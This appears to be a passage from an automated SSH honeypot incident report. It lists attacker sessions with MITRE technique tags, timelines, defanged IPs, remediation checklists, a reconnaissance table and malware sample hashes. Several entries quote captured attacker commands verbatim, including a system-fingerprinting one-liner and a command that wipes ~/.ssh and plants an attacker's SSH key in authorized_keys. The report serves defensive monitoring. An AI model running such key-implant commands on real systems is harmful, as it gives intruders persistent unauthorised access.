| **Last Seen** | 2026-09-10 20:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 20:15:11` | `cowrie.session.connect` |
| `2026-09-10 20:15:11` | `cowrie.client.version` |
| `2026-09-10 20:15:11` | `cowrie.client.kex` |
| `2026-09-10 20:15:12` | `cowrie.login.success` |
| `2026-09-10 20:15:13` | `cowrie.session.params` |
| `2026-09-10 20:15:13` | `cowrie.command.input` |
| `2026-09-10 20:15:13` | `cowrie.command.input` |
| `2026-09-10 20:15:13` | `cowrie.command.input` |
| `2026-09-10 20:15:13` | `cowrie.command.input` |
| `2026-09-10 20:15:13` | `cowrie.command.input` |
| `2026-09-10 20:15:13` | `cowrie.command.success` |
| `2026-09-10 20:15:13` | `cowrie.command.input` |
| `2026-09-10 20:15:13` | `cowrie.command.input` |
| `2026-09-10 20:15:13` | `cowrie.command.input` |
| `2026-09-10 20:15:13` | `cowrie.command.input` |
| `2026-09-10 20:15:13` | `cowrie.log.closed` |
| `2026-09-10 20:15:14` | `cowrie.session.params` |
| `2026-09-10 20:15:14` | `cowrie.command.input` |
| `2026-09-10 20:15:15` | `cowrie.log.closed` |
| `2026-09-10 20:15:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-038cf74a0982

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 20:17 |
| **Last Seen** | 2026-09-10 20:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 20:17:03` | `cowrie.session.connect` |
| `2026-09-10 20:17:03` | `cowrie.client.version` |
| `2026-09-10 20:17:03` | `cowrie.client.kex` |
| `2026-09-10 20:17:04` | `cowrie.login.success` |
| `2026-09-10 20:17:05` | `cowrie.session.params` |
| `2026-09-10 20:17:05` | `cowrie.command.input` |
| `2026-09-10 20:17:05` | `cowrie.command.input` |
| `2026-09-10 20:17:05` | `cowrie.command.input` |
| `2026-09-10 20:17:05` | `cowrie.command.input` |
| `2026-09-10 20:17:05` | `cowrie.command.input` |
| `2026-09-10 20:17:05` | `cowrie.command.success` |
| `2026-09-10 20:17:05` | `cowrie.command.input` |
| `2026-09-10 20:17:05` | `cowrie.command.input` |
| `2026-09-10 20:17:05` | `cowrie.command.input` |
| `2026-09-10 20:17:05` | `cowrie.command.input` |
| `2026-09-10 20:17:06` | `cowrie.log.closed` |
| `2026-09-10 20:17:07` | `cowrie.session.params` |
| `2026-09-10 20:17:07` | `cowrie.command.input` |
| `2026-09-10 20:17:07` | `cowrie.log.closed` |
| `2026-09-10 20:17:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9e5bea327b9

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 20:19 |
| **Last Seen** | 2026-09-10 20:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 20:19:07` | `cowrie.session.connect` |
| `2026-09-10 20:19:07` | `cowrie.client.version` |
| `2026-09-10 20:19:07` | `cowrie.client.kex` |
| `2026-09-10 20:19:08` | `cowrie.login.success` |
| `2026-09-10 20:19:09` | `cowrie.session.params` |
| `2026-09-10 20:19:09` | `cowrie.command.input` |
| `2026-09-10 20:19:09` | `cowrie.command.input` |
| `2026-09-10 20:19:09` | `cowrie.command.input` |
| `2026-09-10 20:19:09` | `cowrie.command.input` |
| `2026-09-10 20:19:09` | `cowrie.command.input` |
| `2026-09-10 20:19:09` | `cowrie.command.success` |
| `2026-09-10 20:19:09` | `cowrie.command.input` |
| `2026-09-10 20:19:09` | `cowrie.command.input` |
| `2026-09-10 20:19:09` | `cowrie.command.input` |
| `2026-09-10 20:19:09` | `cowrie.command.input` |
| `2026-09-10 20:19:09` | `cowrie.log.closed` |
| `2026-09-10 20:19:10` | `cowrie.session.params` |
| `2026-09-10 20:19:10` | `cowrie.command.input` |
| `2026-09-10 20:19:10` | `cowrie.log.closed` |
| `2026-09-10 20:19:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c0afba11dad

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-10 20:22 |
| **Last Seen** | 2026-09-10 20:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 20:22:12` | `cowrie.session.connect` |
| `2026-09-10 20:22:12` | `cowrie.client.version` |
| `2026-09-10 20:22:12` | `cowrie.client.kex` |
| `2026-09-10 20:22:12` | `cowrie.login.success` |
| `2026-09-10 20:22:12` | `cowrie.direct-tcpip.request` |
| `2026-09-10 20:22:13` | `cowrie.direct-tcpip.data` |
| `2026-09-10 20:22:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0113a2f1b95

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-09-10 20:23 |
| **Last Seen** | 2026-09-10 20:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 20:23:35` | `cowrie.session.connect` |
| `2026-09-10 20:23:36` | `cowrie.client.version` |
| `2026-09-10 20:23:37` | `cowrie.client.kex` |
| `2026-09-10 20:23:37` | `cowrie.login.success` |
| `2026-09-10 20:23:37` | `cowrie.direct-tcpip.request` |
| `2026-09-10 20:23:38` | `cowrie.direct-tcpip.data` |
| `2026-09-10 20:23:38` | `cowrie.direct-tcpip.request` |
| `2026-09-10 20:23:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ea7fed5ab88

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-09-10 20:24 |
| **Last Seen** | 2026-09-10 20:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 20:24:09` | `cowrie.session.connect` |
| `2026-09-10 20:24:11` | `cowrie.client.version` |
| `2026-09-10 20:24:11` | `cowrie.client.kex` |
| `2026-09-10 20:24:13` | `cowrie.login.success` |
| `2026-09-10 20:24:13` | `cowrie.direct-tcpip.request` |
| `2026-09-10 20:24:14` | `cowrie.direct-tcpip.data` |
| `2026-09-10 20:24:15` | `cowrie.direct-tcpip.request` |
| `2026-09-10 20:24:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-123324a7e3d3

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-09-10 20:33 |
| **Last Seen** | 2026-09-10 20:33 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 20:33:05` | `cowrie.session.connect` |
| `2026-09-10 20:33:05` | `cowrie.client.version` |
| `2026-09-10 20:33:05` | `cowrie.client.kex` |
| `2026-09-10 20:33:05` | `cowrie.login.success` |
| `2026-09-10 20:33:10` | `cowrie.direct-tcpip.request` |
| `2026-09-10 20:33:10` | `cowrie.direct-tcpip.ja4` |
| `2026-09-10 20:33:10` | `cowrie.direct-tcpip.data` |
| `2026-09-10 20:33:13` | `cowrie.direct-tcpip.request` |
| `2026-09-10 20:33:16` | `cowrie.direct-tcpip.ja4` |
| `2026-09-10 20:33:16` | `cowrie.direct-tcpip.data` |
| `2026-09-10 20:33:17` | `cowrie.direct-tcpip.request` |
| `2026-09-10 20:33:19` | `cowrie.direct-tcpip.ja4` |
| `2026-09-10 20:33:19` | `cowrie.direct-tcpip.data` |
| `2026-09-10 20:33:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e37551ab42e1

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-09-10 20:38 |
| **Last Seen** | 2026-09-10 20:38 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 20:38:25` | `cowrie.session.connect` |
| `2026-09-10 20:38:25` | `cowrie.client.version` |
| `2026-09-10 20:38:25` | `cowrie.client.kex` |
| `2026-09-10 20:38:26` | `cowrie.login.success` |
| `2026-09-10 20:38:36` | `cowrie.direct-tcpip.request` |
| `2026-09-10 20:38:37` | `cowrie.direct-tcpip.ja4` |
| `2026-09-10 20:38:37` | `cowrie.direct-tcpip.data` |
| `2026-09-10 20:38:37` | `cowrie.direct-tcpip.request` |
| `2026-09-10 20:38:39` | `cowrie.direct-tcpip.ja4` |
| `2026-09-10 20:38:39` | `cowrie.direct-tcpip.data` |
| `2026-09-10 20:38:46` | `cowrie.direct-tcpip.request` |
| `2026-09-10 20:38:46` | `cowrie.direct-tcpip.ja4` |
| `2026-09-10 20:38:46` | `cowrie.direct-tcpip.data` |
| `2026-09-10 20:38:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21ce7cd3fbc1

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]116` |
| **First Seen** | 2026-09-10 20:42 |
| **Last Seen** | 2026-09-10 20:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 20:42:47` | `cowrie.session.connect` |
| `2026-09-10 20:42:47` | `cowrie.client.version` |
| `2026-09-10 20:42:47` | `cowrie.client.kex` |
| `2026-09-10 20:42:48` | `cowrie.login.success` |
| `2026-09-10 20:42:48` | `cowrie.direct-tcpip.request` |
| `2026-09-10 20:42:48` | `cowrie.direct-tcpip.data` |
| `2026-09-10 20:42:48` | `cowrie.direct-tcpip.request` |
| `2026-09-10 20:42:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]116` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]116` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10d78012661c

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]116` |
| **First Seen** | 2026-09-10 20:43 |
| **Last Seen** | 2026-09-10 20:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 20:43:56` | `cowrie.session.connect` |
| `2026-09-10 20:43:57` | `cowrie.client.version` |
| `2026-09-10 20:43:57` | `cowrie.client.kex` |
| `2026-09-10 20:43:57` | `cowrie.login.success` |
| `2026-09-10 20:43:58` | `cowrie.direct-tcpip.request` |
| `2026-09-10 20:43:58` | `cowrie.direct-tcpip.data` |
| `2026-09-10 20:43:58` | `cowrie.direct-tcpip.request` |
| `2026-09-10 20:43:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]116` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]116` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abda5eb51c95

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-10 20:50 |
| **Last Seen** | 2026-09-10 20:50 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 20:50:12` | `cowrie.session.connect` |
| `2026-09-10 20:50:14` | `cowrie.client.version` |
| `2026-09-10 20:50:14` | `cowrie.client.kex` |
| `2026-09-10 20:50:18` | `cowrie.login.success` |
| `2026-09-10 20:50:23` | `cowrie.direct-tcpip.request` |
| `2026-09-10 20:50:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f1b389c5133

| Field | Detail |
|---|---|
| **Source IP** | `14.103.107[.]221` |
| **First Seen** | 2026-09-10 20:54 |
| **Last Seen** | 2026-09-10 20:54 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 20:54:01` | `cowrie.session.connect` |
| `2026-09-10 20:54:01` | `cowrie.client.version` |
| `2026-09-10 20:54:03` | `cowrie.client.kex` |
| `2026-09-10 20:54:04` | `cowrie.login.success` |
| `2026-09-10 20:54:06` | `cowrie.session.params` |
| `2026-09-10 20:54:06` | `cowrie.command.input` |
| `2026-09-10 20:54:06` | `cowrie.command.failed` |
| `2026-09-10 20:54:06` | `cowrie.log.closed` |
| `2026-09-10 20:54:07` | `cowrie.session.params` |
| `2026-09-10 20:54:07` | `cowrie.command.input` |
| `2026-09-10 20:54:07` | `cowrie.session.file_download` |
| `2026-09-10 20:54:07` | `cowrie.log.closed` |
| `2026-09-10 20:54:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.107[.]221` to AbuseIPDB if not already reported
- [ ] Block `14.103.107[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef049fc83280

| Field | Detail |
|---|---|
| **Source IP** | `14.103.107[.]221` |
| **First Seen** | 2026-09-10 20:54 |
| **Last Seen** | 2026-09-10 20:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 20:54:07` | `cowrie.session.connect` |
| `2026-09-10 20:54:09` | `cowrie.client.version` |
| `2026-09-10 20:54:09` | `cowrie.client.kex` |
| `2026-09-10 20:54:09` | `cowrie.login.success` |
| `2026-09-10 20:54:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.107[.]221` to AbuseIPDB if not already reported
- [ ] Block `14.103.107[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37983b7eb3a6

| Field | Detail |
|---|---|
| **Source IP** | `201.76.120[.]30` |
| **First Seen** | 2026-09-10 20:54 |
| **Last Seen** | 2026-09-10 20:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 20:54:44` | `cowrie.session.connect` |
| `2026-09-10 20:54:44` | `cowrie.client.version` |
| `2026-09-10 20:54:44` | `cowrie.client.kex` |
| `2026-09-10 20:54:45` | `cowrie.login.success` |
| `2026-09-10 20:54:45` | `cowrie.session.params` |
| `2026-09-10 20:54:45` | `cowrie.command.input` |
| `2026-09-10 20:54:45` | `cowrie.command.failed` |
| `2026-09-10 20:54:46` | `cowrie.log.closed` |
| `2026-09-10 20:54:47` | `cowrie.session.params` |
| `2026-09-10 20:54:47` | `cowrie.command.input` |
| `2026-09-10 20:54:47` | `cowrie.session.file_download` |
| `2026-09-10 20:54:47` | `cowrie.log.closed` |
| `2026-09-10 20:54:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.76.120[.]30` to AbuseIPDB if not already reported
- [ ] Block `201.76.120[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b6db718f587

| Field | Detail |
|---|---|
| **Source IP** | `201.76.120[.]30` |
| **First Seen** | 2026-09-10 20:54 |
| **Last Seen** | 2026-09-10 20:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 20:54:47` | `cowrie.session.connect` |
| `2026-09-10 20:54:47` | `cowrie.client.version` |
| `2026-09-10 20:54:47` | `cowrie.client.kex` |
| `2026-09-10 20:54:48` | `cowrie.login.success` |
| `2026-09-10 20:54:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.76.120[.]30` to AbuseIPDB if not already reported
- [ ] Block `201.76.120[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae34a96652ff

| Field | Detail |
|---|---|
| **Source IP** | `201.76.120[.]30` |
| **First Seen** | 2026-09-10 20:54 |
| **Last Seen** | 2026-09-10 20:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 20:54:48` | `cowrie.session.connect` |
| `2026-09-10 20:54:48` | `cowrie.client.version` |
| `2026-09-10 20:54:48` | `cowrie.client.kex` |
| `2026-09-10 20:54:49` | `cowrie.login.success` |
| `2026-09-10 20:54:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.76.120[.]30` to AbuseIPDB if not already reported
- [ ] Block `201.76.120[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `51.158.205[.]203` | **6** | 2026-09-10 20:19 | 2026-09-10 20:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `86.54.31[.]32` | **4** | 2026-09-10 20:40 | 2026-09-10 20:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | **2** | 2026-09-10 19:16 | 2026-09-10 20:49 | 1m | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | **2** | 2026-09-10 20:10 | 2026-09-10 20:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]61` | **2** | 2026-09-10 19:53 | 2026-09-10 19:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `75.137.186[.]127` | **2** | 2026-09-10 20:50 | 2026-09-10 20:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `115.190.216[.]185` | 1 | 2026-09-10 19:51 | 2026-09-10 19:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.107[.]221` | 1 | 2026-09-10 20:54 | 2026-09-10 20:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `151.63.114[.]140` | 1 | 2026-09-10 19:26 | 2026-09-10 19:26 | 13s | 0 | `T1592` | 🟢 LOW |
| `172.104.210[.]105` | 1 | 2026-09-10 19:45 | 2026-09-10 19:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.69.53[.]202` | 1 | 2026-09-10 20:23 | 2026-09-10 20:23 | 11s | 0 | `T1592` | 🟢 LOW |
| `217.60.255[.]130` | 1 | 2026-09-10 19:58 | 2026-09-10 19:58 | 4s | 0 | `T1592` | 🟢 LOW |
| `42.51.42[.]209` | 1 | 2026-09-10 19:48 | 2026-09-10 19:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-09-10 19:06 | 2026-09-10 19:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]8` | 1 | 2026-09-10 20:34 | 2026-09-10 20:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]179` | 1 | 2026-09-10 18:55 | 2026-09-10 18:55 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.132.112[.]9` | 1 | 2026-09-10 19:25 | 2026-09-10 19:26 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
